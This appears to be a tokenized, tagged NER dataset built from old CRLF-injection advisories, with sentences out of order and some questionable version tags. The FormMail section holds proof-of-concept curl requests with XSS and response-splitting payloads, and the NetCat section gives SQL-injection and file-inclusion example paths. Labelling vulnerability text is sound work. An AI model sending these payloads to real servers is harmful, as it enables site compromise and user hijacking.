1.6 S-vulnerable_version pair_0
) O O
is O O
vulnerable O O
to O O
a O O
CRLF O O
Injection O O
vulnerability O O
. O O

Disclosure O O
Timeline O O
2009 O O
, O O
November O O
07 O O
: O O
Vulnerabilities O O
discovered O O
and O O
documented O O
2009 O O
, O O
November O O
08 O O
: O O
Notification O O
sent O O
to O O
IBM O O
2009 O O
, O O
November O O
09 O O
: O O
IBM O O
acknowledges O O
receiving O O
the O O
report O O
2010 O O
, O O
September O O
12 O O
: O O
MVSA-10-009 O O
advisory O O
published O O
. O O

By O O
manipulating O O
the O O
javaVersion O O
parameter O O
of O O
load.php O O
resource O O
, O O
an O O
authenticated O O
attacker O O
can O O
perform O O
the O O
attacks O O
above O O
. O O

The O O
affected O O
resource O O
is O O
not O O
part O O
of O O
the O O
IBM O O
PNMSS O O
firmware O O
2.5 O O
. O O

Vendor O O
recommends O O
upgrading O O
to O O
PNMSS O O
firmware O O
2.5 O O
or O O
later O O
. O O

When O O
exploited O O
by O O
an O O
authenticated O O
attacker O O
, O O
such O O
vulnerability O O
could O O
lead O O
to O O
compromising O O
the O O
security O O
of O O
the O O
appliance O O
, O O
allowing O O
injection O O
of O O
custom O O
HTTP O O
cookies O O
, O O
forcing O O
external O O
redirects O O
, O O
potential O O
HTTP O O
Response O O
Splitting O O
attacks O O
, O O
etc O O
. O O

Security O O
Advisory O O
: O O
MVSA-10-009 O O
CVE-2010-0155 O O

MVSA-10-009 O O
CVE-2010-0155 O O
- O O
IBM O O
Proventia O O
Network O O
Mail O O
Security O O
System O O
- O O
CRLF O O
Injection O O
vulnerability O O

NOTE O O
: O O
some O O
of O O
these O O
details O O
are O O
obtained O O
from O O
third O O
party O O
information O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
Xerver S-vulnerable_software pair_0
HTTP S-vulnerable_software pair_0
Server S-vulnerable_software pair_0
4.31 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
4.32 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
certain O O
byte O O
sequences O O
at O O
the O O
end O O
of O O
a O O
URL O O
. O O

The O O
web O O
interface O O
in O O
CUPS S-vulnerable_software pair_0
before S-vulnerable_version pair_0
1.4.2 S-vulnerable_version pair_0
, O O
as O O
used O O
on O O
Apple S-vulnerable_software pair_1
Mac S-vulnerable_software pair_1
OS S-vulnerable_software pair_1
X S-vulnerable_software pair_1
before S-vulnerable_version pair_1
10.6.2 S-vulnerable_version pair_1
and O O
other O O
platforms O O
, O O
does O O
not O O
properly O O
handle O O
( O O
1 O O
) O O
HTTP O O
headers O O
and O O
( O O
2 O O
) O O
HTML O O
templates O O
, O O
which O O
allows O O
remote O O
attackers O O
to O O
conduct O O
cross-site O O
scripting O O
( O O
XSS O O
) O O
attacks O O
and O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
vectors O O
related O O
to O O
( O O
a O O
) O O
the O O
product O O
web O O
interface O O
, O O
( O O
b O O
) O O
the O O
configuration O O
of O O
the O O
print O O
system O O
, O O
and O O
( O O
c O O
) O O
the O O
titles O O
of O O
printed O O
jobs O O
, O O
as O O
demonstrated O O
by O O
an O O
XSS O O
attack O O
that O O
uses O O
the O O
kerberos O O
parameter O O
to O O
the O O
admin O O
program O O
, O O
and O O
leverages O O
attribute O O
injection O O
and O O
HTTP O O
Parameter O O
Pollution O O
( O O
HPP O O
) O O
issues O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
FormMail.pl O O
in O O
Matt S-vulnerable_software pair_0
Wright S-vulnerable_software pair_0
FormMail S-vulnerable_software pair_0
1.92 S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
possibly S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
the O O
redirect O O
parameter O O
. O O

LEGAL O O
NOTICES O O
Copyright O O
( O O
c O O
) O O
2009 O O
Francesco O O
ascii O O
Ongaro O O
Permission O O
is O O
granted O O
for O O
the O O
redistribution O O
of O O
this O O
alert O O
electronically O O
. O O

Disclaimer O O
: O O
The O O
information O O
in O O
the O O
advisory O O
is O O
believed O O
to O O
be O O
accurate O O
at O O
the O O
time O O
of O O
publishing O O
based O O
on O O
currently O O
available O O
information O O
. O O

( O O
1 O O
replies O O
) O O

V. O O
WORKAROUND O O
VI O O
. O O

sub O O
clean_html O O
{ O O
local O O
$ O O
value O O
value O O
=~ O O
s O O
& O O
& O O
/g O O
; O O
$ O O
value O O
=~ O O
s/ O O
< O O
< O O
/g O O
; O O
$ O O
value O O
=~ O O
s/ O O
/g O O
; O O
$ O O
value O O
=~ O O
s O O
/g O O
; O O
return O O
$ O O
value O O
; O O
} O O
8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
These O O
functions O O
are O O
not O O
always O O
applied O O
to O O
the O O
user O O
input O O
and O O
don O O
t O O
protect O O
against O O
all O O
the O O
attack O O
vectors O O
( O O
as O O
URI O O
or O O
DOM O O
XSS O O
that O O
can O O
work O O
also O O
if O O
encoded O O
) O O
, O O
this O O
is O O
why O O
various O O
vulnerabilities O O
exist O O
. O O

A O O
second O O
XSS O O
vulnerability O O
, O O
not O O
based O O
on O O
HTTP O O
tricks O O
, O O
exists O O
: O O
in O O
the O O
following O O
code O O
the O O
the O O
$ O O
return_link O O
variable O O
is O O
reflected O O
( O O
printed O O
) O O
in O O
the O O
page O O
body O O
without O O
any O O
validation O O
: O O
8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
Line O O
371 O O
: O O
the O O
$ O O
return_link O O
variable O O
is O O
printed O O
in O O
the O O
page O O
body O O
without O O
any O O
validation O O
. O O

CVE O O
INFORMATION O O
No O O
CVE O O
at O O
this O O
time O O
. O O

if O O
( O O
$ O O
Config O O
{ O O
redirect O O
print O O
Location O O
: O O
$ O O
safeConfig O O
{ O O
redirect O O
8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
XSS O O
vulnerability O O
example O O
: O O
( O O
at O O
) O O
ush O O
( O O
dot O O
) O O
it O O
[ O O
email O O
concealed O O
] O O
& O O
subject=1 O O
& O O
redire O O
ct=javascript O O
: O O
alert O O
( O O
% O O
27USH O O
% O O
27 O O
) O O
; O O
Response O O
: O O
$ O O
curl O O
-kis O O
( O O
at O O
) O O
ush O O
( O O
dot O O
) O O
it O O
[ O O
email O O
concealed O O
] O O
& O O
sub O O
ject=1 O O
& O O
redirect=javascript O O
: O O
alert O O
( O O
% O O
27USH O O
% O O
27 O O
) O O
; O O
8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
HTTP/1.1 O O
302 O O
Found O O
Date O O
: O O
Sat O O
, O O
11 O O
Apr O O
2009 O O
14:12:11 O O
GMT O O
Server O O
: O O
Apache O O
Location O O
: O O
javascript O O
: O O
alert O O
( O O
USH O O
) O O
; O O
Content-Length O O
: O O
267 O O
Content-Type O O
: O O
text/html O O
; O O
charset=iso-8859-1 O O

The O O
following O O
request O O
is O O
an O O
example O O
of O O
the O O
attack O O
: O O
( O O
at O O
) O O
ush O O
( O O
dot O O
) O O
it O O
[ O O
email O O
concealed O O
] O O
& O O
subject=1 O O
& O O
redire O O
ct= O O
xt/plain O O
% O O
0D O O
% O O
0AStatus:302 O O
% O O
0D O O
% O O
0A O O
% O O
0D O O
% O O
0AHTTP/1.1 O O
% O O
20200 O O
% O O
20OK O O
% O O
0D O O
% O O
0AContent-Typ O O
e O O
: O O
% O O
20text/plain O O
% O O
0D O O
% O O
0A O O
8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
$ O O
curl O O
-kis O O
( O O
at O O
) O O
ush O O
( O O
dot O O
) O O
it O O
[ O O
email O O
concealed O O
] O O
& O O
sub O O
ject=1 O O
& O O
redirect= O O
% O O
0D O O
% O O
0A O O
% O O
0FContent-Length O O
: O O
% O O
200 O O
% O O
0D O O
% O O
0AContent-Type O O
: O O
% O O
20text/p O O
lain O O
% O O
0D O O
% O O
0AStatus:302 O O
% O O
0D O O
% O O
0A O O
% O O
0D O O
% O O
0AHTTP/1.1 O O
% O O
20200 O O
% O O
20OK O O
% O O
0D O O
% O O
0AContent-Type O O
: O O
% O O
2 O O
0text/plain O O
% O O
0D O O
% O O
0A O O
HTTP/1.1 O O
302 O O
Found O O
Date O O
: O O
Sun O O
, O O
12 O O
Apr O O
2009 O O
23:01:18 O O
GMT O O
Server O O
: O O
Apache O O
Content-Length O O
: O O
0 O O
Location O O
: O O
Transfer-Encoding O O
: O O
chunked O O
Content-Type O O
: O O
text/plain O O
HTTP/1.1 O O
200 O O
OK O O
Content-Type O O
: O O

DISCLOSURE O O
TIMELINE O O
20070501 O O
Bug O O
discovered O O
20070531 O O
Initial O O
vendor O O
contact O O
( O O
Thu O O
, O O
31 O O
May O O
2007 O O
22:21:39 O O
+0200 O O
) O O
No O O
response O O
and O O
the O O
bug O O
sleeped O O
for O O
some O O
time O O
in O O
ascii O O
mind O O
20090505 O O
Second O O
vendor O O
contact O O
Giving O O
up O O
, O O
will O O
have O O
better O O
results O O
with O O
forced O O
disclosure O O
20090511 O O
Advisory O O
Release O O
IX O O
. O O

Since O O
Header O O
Injection O O
is O O
one O O
of O O
the O O
most O O
versatile O O
attack O O
vectors O O
we O O
could O O
use O O
it O O
( O O
like O O
downgrade O O
it O O
) O O
to O O
perform O O
a O O
Cross O O
Site O O
Scripting O O
attack O O
but O O
it O O
would O O
not O O
represent O O
a O O
different O O
vulnerability O O
. O O

FormMail O O
is O O
quite O O
possibily O O
the O O
most O O
used O O
CGI O O
program O O
on O O
the O O
internet O O
, O O
having O O
been O O
downloaded O O
over O O
2,000,000 O O
times O O
since O O
1997 O O
. O O

if O O
( O O
$ O O
Config O O
{ O O
return_link_url O O
Config O O
{ O O
return_link_title O O
print O O
< O O
ul O O
; O O
print O O
< O O
li O O
> O O
< O O
a O O
href= O O
$ O O
safeConfig O O
{ O O
return_link_url O O
safeConfig O O
{ O O
return_link_title O O
} O O
< O O
/a O O
; O O
print O O
< O O
/ul O O
; O O
} O O
8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
The O O
vulnerability O O
can O O
be O O
triggered O O
with O O
the O O
following O O
request O O
: O O
$ O O
curl O O
-kis O O
( O O
at O O
) O O
ush O O
( O O
dot O O
) O O
it O O
[ O O
email O O
concealed O O
] O O
& O O
subj O O
ect=1 O O
& O O
return_link_url=javascript O O
: O O
alert O O
( O O
% O O
27USH O O
% O O
27 O O
) O O
; O O
& O O
return_link_title=USH O O
This O O
XSS O O
is O O
not O O
automatic O O
. O O

D O O
) O O
HTTP O O
Response O O
Splitting O O
Thanks O O
to O O
the O O
full O O
exploitability O O
of O O
the O O
Header O O
Injection O O
vulnerability O O
an O O
HTTP O O
Response O O
Splitting O O
can O O
be O O
performed O O
. O O

It O O
may O O
not O O
be O O
edited O O
in O O
any O O
way O O
without O O
mine O O
express O O
written O O
consent O O
. O O

B O O
) O O
Cross O O
Site O O
Scripting O O
vulnerability O O
Line O O
293 O O
: O O
the O O
redirect O O
variable O O
is O O
used O O
to O O
write O O
the O O
location O O
header O O
value O O
. O O

There O O
are O O
several O O
downloading O O
options O O
available O O
below O O
and O O
more O O
information O O
on O O
this O O
script O O
can O O
be O O
found O O
in O O
the O O
Readme O O
file O O
. O O

8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
foreach O O
$ O O
field O O
( O O
keys O O
% O O
Config O O
) O O
{ O O
$ O O
safeConfig O O
{ O O
$ O O
field O O
} O O
= O O
& O O
clean_html O O
( O O
$ O O
Config O O
{ O O
$ O O
field O O
} O O
) O O
; O O
} O O
8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
Line O O
518 O O
: O O
definition O O
of O O
clean_html O O
function O O
, O O
used O O
to O O
generate O O
the O O
$ O O
safeConfig O O
array O O
from O O
$ O O
Config O O
. O O

CREDIT O O
Francesco O O
ascii O O
Ongaro O O
, O O
Giovanni O O
evilaliv3 O O
Pellerano O O
and O O
Antonio O O
s4tan O O
Parata O O
are O O
credited O O
with O O
the O O
discovery O O
of O O
this O O
vulnerability O O
. O O

This O O
also O O
makes O O
FormMail O O
the O O
perfect O O
system-wide O O
solution O O
for O O
allowing O O
users O O
form-based O O
user O O
feedback O O
capabilities O O
without O O
the O O
risks O O
of O O
allowing O O
freedom O O
of O O
CGI O O
access O O
. O O

Affected O O
FormMail S-vulnerable_software pair_0
1.92 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
possibly S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
versions S-vulnerable_version pair_0
Severity O O
Medium O O
Impact O O
( O O
CVSSv2 O O
) O O
Medium O O
4.3/10 O O
, O O
vector O O
: O O
( O O
AV O O
: O O
N/AC O O
: O O
M/Au O O
: O O
N/C O O
: O O
P/I O O
: O O
N/A O O
: O O
N O O
) O O

C O O
) O O
HTTP O O
Response O O
Header O O
Injection O O
An O O
HTTP O O
Response O O
Header O O
Injection O O
vulnerability O O
exists O O
, O O
the O O
following O O
request O O
triggers O O
the O O
vulnerability O O
: O O
$ O O
curl O O
-kis O O
( O O
at O O
) O O
ush O O
( O O
dot O O
) O O
it O O
[ O O
email O O
concealed O O
] O O
& O O
sub O O
ject=1 O O
& O O
redirect= O O
DHTTPHeaderInjection O O
; O O
Can O O
be O O
verified O O
with O O
the O O
obvious O O
javascript O O
: O O
alert O O
( O O
document.cookie O O
) O O
. O O

Its O O
value O O
is O O
not O O
filtered O O
so O O
it O O
possible O O
to O O
perform O O
both O O
HTTP O O
Header O O
Injection O O
and O O
an O O
HTTP O O
Response O O
Splitting O O
attacks O O
. O O

There O O
are O O
no O O
warranties O O
with O O
regard O O
to O O
this O O
information O O
. O O

Neither O O
the O O
author O O
nor O O
the O O
publisher O O
accepts O O
any O O
liability O O
for O O
any O O
direct O O
, O O
indirect O O
, O O
or O O
consequential O O
loss O O
or O O
damage O O
arising O O
from O O
use O O
of O O
, O O
or O O
reliance O O
on O O
, O O
this O O
information O O
. O O

FormMail S-vulnerable_software pair_0
1.92 S-vulnerable_version pair_0
Multiple O O
Vulnerabilities O O
Name O O
Multiple O O
Vulnerabilities O O
in O O
FormMail O O
Systems O O

In O O
this O O
case O O
we O O
are O O
already O O
inside O O
a O O
Location O O
response O O
header O O
and O O
it O O
possible O O
to O O
perform O O
an O O
XSS O O
without O O
splitting O O
the O O
response O O
and O O
using O O
the O O
standard O O
Apache O O
page O O
for O O
the O O
302 O O
Found O O
HTTP O O
status O O
. O O

This O O
script O O
has O O
many O O
formatting O O
and O O
operational O O
options O O
, O O
most O O
of O O
which O O
can O O
be O O
specified O O
within O O
each O O
form O O
, O O
meaning O O
you O O
don O O
t O O
need O O
programming O O
knowledge O O
or O O
multiple O O
scripts O O
for O O
multiple O O
forms O O
. O O

8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
Check O O
for O O
a O O
Return O O
Link O O
and O O
print O O
one O O
if O O
found O O
. O O

VENDOR O O
RESPONSE O O
VII O O
. O O

Use O O
of O O
the O O
information O O
constitutes O O
acceptance O O
for O O
use O O
in O O
an O O
AS O O
IS O O
condition O O
. O O

Francesco O O
ascii O O
Ongaro O O
web O O
site O O
: O O
mail O O
: O O
ascii O O
AT O O
ush O O
DOT O O
it O O
Giovanni O O
evilaliv3 O O
Pellerano O O
web O O
site O O
: O O
mail O O
: O O
giovanni.pellerano O O
AT O O
evilaliv3 O O
DOT O O
org O O
Antonio O O
s4tan O O
Parata O O
web O O
site O O
: O O
mail O O
: O O
s4tan O O
AT O O
ictsc O O
DOT O O
it O O
, O O
s4tan O O
AT O O
ush O O
DOT O O
it O O
X O O
. O O

BACKGROUND O O
FormMail O O
is O O
a O O
generic O O
HTML O O
form O O
to O O
e-mail O O
gateway O O
that O O
parses O O
the O O
results O O
of O O
any O O
form O O
and O O
sends O O
them O O
to O O
the O O
specified O O
users O O
. O O

8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
This O O
function O O
will O O
convert O O
and O O
to O O
their O O
HTML O O
equivalents O O
. O O

DETECTION O O
FormMail S-vulnerable_software pair_0
1.92 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
possibly S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
versions O O
are O O
vulnerable O O
. O O

Vendor O O
Advisory O O
Authors O O
Francesco O O
ascii O O
Ongaro O O
( O O
ascii O O
AT O O
ush O O
DOT O O
it O O
) O O
Giovanni O O
evilaliv3 O O
Pellerano O O
( O O
evilaliv3 O O
AT O O
ush O O
DOT O O
it O O
) O O
Antonio O O
s4tan O O
Parata O O
( O O
s4tan O O
AT O O
ush O O
DOT O O
it O O
) O O
Date O O
20090511 O O
I O O
. O O

If O O
you O O
wish O O
to O O
reprint O O
the O O
whole O O
or O O
any O O
part O O
of O O
this O O
alert O O
in O O
any O O
other O O
medium O O
other O O
than O O
electronically O O
, O O
please O O
email O O
me O O
for O O
permission O O
. O O

DESCRIPTION O O
Multiple O O
Vulnerabilities O O
exist O O
in O O
FormMail O O
software O O
. O O

Summary O O
: O O
A O O
) O O
Prelude O O
to O O
the O O
vulnerabities O O
B O O
) O O
Cross O O
Site O O
Scripting O O
C O O
) O O
HTTP O O
Response O O
Header O O
Injection O O
D O O
) O O
HTTP O O
Response O O
Splitting O O
A O O
) O O
Prelude O O
to O O
the O O
vulnerabities O O
What O O
follows O O
is O O
the O O
code O O
used O O
to O O
validate O O
the O O
user O O
input O O
: O O
Line O O
283 O O
: O O
$ O O
safeConfig O O
array O O
definition O O
. O O

8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
-8 O O
< O O
If O O
redirect O O
option O O
is O O
used O O
, O O
print O O
the O O
redirectional O O
location O O
header O O
. O O

FormMail S-vulnerable_software pair_0
1.92 S-vulnerable_version pair_0
Multiple O O
Vulnerabilities O O

CRLF O O
injection O O
vulnerability O O
in O O
the O O
WebLink O O
template O O
in O O
Fujitsu S-vulnerable_software pair_0
Jasmine2000 S-vulnerable_software pair_0
Enterprise S-vulnerable_version pair_0
Edition S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
unspecified O O
vectors O O
. O O

NOTE O O
: O O
this O O
was O O
reported O O
within O O
an O O
HTTP O O
Response O O
Splitting O O
section O O
in O O
the O O
original O O
disclosure O O
. O O

Multiple O O
open O O
redirect O O
vulnerabilities O O
in O O
AIST S-vulnerable_software pair_0
NetCat S-vulnerable_software pair_0
3.12 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
allow O O
remote O O
attackers O O
to O O
redirect O O
users O O
to O O
arbitrary O O
web O O
sites O O
and O O
conduct O O
phishing O O
attacks O O
via O O
( O O
1 O O
) O O
the O O
redirect O O
parameter O O
in O O
a O O
logoff O O
action O O
to O O
modules/auth/index.php O O
or O O
( O O
2 O O
) O O
the O O
url O O
parameter O O
to O O
modules/linkmanager/redirect.php O O
. O O

Blind O O
SQL O O
Injection O O
Vulnerabilities O O
Examples O O
of O O
vulnerable O O
files O O
: O O
/netcat/modules/auth/password_recovery.php O O
=1 O O
SQL_code O O
Example O O
: O O
/netcat/modules/auth/password_recovery.php O O
=1 O O
/OR O O
/VERSION O O
( O O
) O O
/LIKE O O
4 O O
% O O
The O O
note O O
: O O
For O O
vulnerability O O
operation O O
the O O
following O O
options O O
PHP O O
are O O
required O O
: O O
magic_quotes_gpc=Off O O
3 O O
. O O

Multiple O O
Cross-site O O
Scripting O O
Vulnerabilities O O
Examples O O
of O O
vulnerable O O
files O O
: O O
/netcat/admin/siteinfo/iframe.inc.php O O
path= O O
/netcat/FCKeditor/neditor.php O O
form= O O
< O O
XSS O O
> O O
& O O
control= O O
< O O
XSS O O
etc O O
. O O

milw0rm.com O O
[ O O
2008-12-23 O O
] O O

NetCat S-vulnerable_software pair_0
< S-vulnerable_version pair_0
= S-vulnerable_version pair_0
3.12 S-vulnerable_version pair_0
Multiple O O
Remote O O
Vulnerabilities O O
The O O
description O O
: O O
The O O
set O O
vulnerability O O
in O O
CMS O O
NetCat O O
versions O O
3.12 O O
and O O
more O O
low O O
was O O
revealed O O
. O O

Multiple O O
File O O
Including O O
Vulnerabilities O O
Vulnerability O O
exists O O
for O O
the O O
reason O O
that O O
direct O O
access O O
to O O
some O O
files O O
, O O
around O O
logicians O O
of O O
work O O
of O O
the O O
appendix O O
is O O
possible O O
. O O

Examples O O
of O O
vulnerable O O
files O O
: O O
/netcat/modules/netshop/post.php O O
system O O
htaccess O O
% O O
00 O O
/netcat/modules/auth.inc.php O O
INCLUDE_FOLDER O O
htaccess O O
% O O
00 O O
/netcat/modules/banner.inc.php O O
INCLUDE_FOLDER O O
htaccess O O
% O O
00 O O
/netcat/modules/blog.inc.php O O
INCLUDE_FOLDER O O
htaccess O O
% O O
00 O O
/netcat/modules/forum.inc.php O O
INCLUDE_FOLDER O O
htaccess O O
% O O
00 O O
The O O
note O O
: O O
For O O
vulnerability O O
operation O O
the O O
following O O
options O O
PHP O O
are O O
required O O
: O O
register_globals=On O O
and O O
magic_quotes_gpc=Off O O
2 O O
. O O

It O O
gives O O
the O O
chance O O
to O O
redefine O O
internal O O
variables O O
which O O
are O O
transferred O O
as O O
arguments O O
in O O
function O O
include O O
( O O
) O O
. O O

Vulnerability O O
has O O
been O O
found O O
out O O
at O O
the O O
reference O O
to O O
a O O
file O O
/netcat/add.php O O
. O O

HTTP O O
Response O O
Splitting O O
Examples O O
of O O
vulnerable O O
files O O
: O O
/netcat/modules/auth/index.php O O
logoff=1 O O
& O O
redirect= O O
/netcat/modules/linkmanager/redirect.php O O
url= O O
CRLF O O
injection O O
Vulnerability O O
exists O O
at O O
the O O
moment O O
of O O
value O O
installation O O
% O O
0a O O
in O O
COOKIEvariables O O
. O O

CMS S-vulnerable_software pair_0
NetCat S-vulnerable_software pair_0
3.12 S-vulnerable_version pair_0
- O O
Multiple O O
Vulnerabilities O O

CRLF O O
injection O O
vulnerability O O
in O O
Sys.Web O O
in O O
Mono S-vulnerable_software pair_0
2.0 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
CRLF O O
sequences O O
in O O
the O O
query O O
string O O
. O O

rPath O O
Security O O
Advisory O O
: O O
2008-0286-1 O O
Published O O
: O O
2008-09-29 O O
Products O O
: O O
rPath O O
Linux O O
2 O O
Rating O O
: O O
Major O O
Exposure O O
Level O O
Classification O O
: O O
Remote O O
User O O
Deterministic O O
Vulnerability O O
Updated O O
Versions O O
: O O
mono=conary.rpath.com O O
@ O O
rpl:2/1.2.6-5-0.1 O O
References O O
: O O

This O O
file O O
is O O
distributed O O
under O O
the O O
terms O O
of O O
the O O
MIT O O
License O O
. O O

Copyright O O
2008 O O
rPath O O
, O O
Inc O O
. O O

A O O
copy O O
is O O
available O O
at O O

Description O O
: O O
Previous O O
versions O O
of O O
the O O
mono O O
package O O
contain O O
an O O
HTTP O O
header O O
vulnerability O O
which O O
may O O
allow O O
attackers O O
to O O
insert O O
cross-site O O
scripting O O
or O O
other O O
malicious O O
code O O
into O O
an O O
HTTP O O
response O O
. O O

rPSA-2008-0286-1 O O
mono O O

Subject O O
: O O
CVE O O
request O O
: O O
mono O O
Sys.Web O O
header O O
injection O O

( O O
bug O O
for O O
reference O O
) O O
Ciao O O
, O O
Marcus O O

Date O O
: O O
Wed O O
, O O
27 O O
Aug O O
2008 O O
18:25:56 O O
+0200 O O
From O O
: O O
Marcus O O
Meissner O O
< O O
meissner O O
@ O O
... O O
e.de O O
To O O
: O O
coley O O
@ O O
... O O
re.org O O
Cc O O
: O O
oss-security O O
@ O O
... O O
ts.openwall.com O O

Hi O O
, O O
Monos O O
Sys.Web O O
DLL O O
is O O
prone O O
to O O
HTTP O O
header O O
injection O O
attacks O O
, O O
which O O
have O O
been O O
fixed O O
in O O
mono O O
SVN O O
now O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
Mambo S-vulnerable_software pair_0
before S-vulnerable_version pair_0
4.6.4 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
unspecified O O
vectors O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
the O O
drupal_goto O O
function O O
in O O
includes/common.inc O O
Drupal S-vulnerable_software pair_0
4.7.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
4.7.8 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
5.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
5.3 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
unspecified O O
vectors O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
Joomla S-vulnerable_software pair_0
before S-vulnerable_version pair_0
1.0.13 S-vulnerable_version pair_0
( O O
aka O O
Sunglow O O
) O O
allows O O
remote O O
attackers O O
